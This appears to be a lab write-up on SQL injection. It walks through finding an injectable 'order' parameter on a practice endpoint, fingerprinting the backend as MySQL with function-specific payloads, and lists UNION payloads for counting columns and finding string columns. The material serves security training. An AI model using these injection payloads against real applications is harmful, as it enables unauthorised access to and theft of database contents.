LAB 8.3.2 — UNION-Based Payloads

Identifying the Database Type

Endpoint: POST /exploit/api/union  ·  Parameters: name, sort, order
✅ Answer: MySQL

1 Establish a Baseline

Sending a blank name parameter returned all products with 4 columns: id, name, description, price. This revealed the underlying query structure:

SQL (inferred)
SELECT id, name, description, price FROM products
WHERE name LIKE '%%'
ORDER BY id ASC
Baseline request
name=&sort=id&order=asc

2 Find the Injection Point

Each parameter was tested with a subquery to see which one accepted it without erroring:

→
Testing order parameter
payload
name=&sort=id&order=asc,(SELECT NULL)-- -

Returned 200 OK with all products — confirmed order is injectable.

3 Rule Out Each Database Type

DB-specific syntax was injected one at a time. A 200 means the function exists; a 500 means it doesn't.

Database Payload Result Conclusion
MSSQL / MySQL order=asc,(SELECT @@version)-- - ✓ 200 Could be either
PostgreSQL order=asc,(SELECT version())-- - ✓ 200 Still ambiguous
Oracle order=asc,(SELECT banner FROM v$version WHERE rownum=1)-- - ✗ 500 ❌ Ruled out
MSSQL order=asc,(SELECT GETDATE())-- - ✗ 500 ❌ Ruled out
MySQL order=asc,(SELECT sleep(0))-- - ✓ 200 ✅ Confirmed MySQL
Key insight: sleep() is MySQL-exclusive. MSSQL uses WAITFOR DELAY, PostgreSQL uses pg_sleep(), and Oracle uses dbms_lock.sleep(). A 200 response on sleep(0) is a definitive MySQL fingerprint.

5 General UNION Injection Tips

Find column count — WHERE clause injection

SQL
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   ← when this errors, column count = 2

Find column count — ORDER BY injection

SQL
order=asc UNION SELECT NULL-- -
order=asc UNION SELECT NULL,NULL-- -
order=asc UNION SELECT NULL,NULL,NULL-- -   ← keep going until 200

Find string columns

SQL
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -
' UNION SELECT NULL,NULL,'a',NULL-- -   ← whichever returns 200 = string column
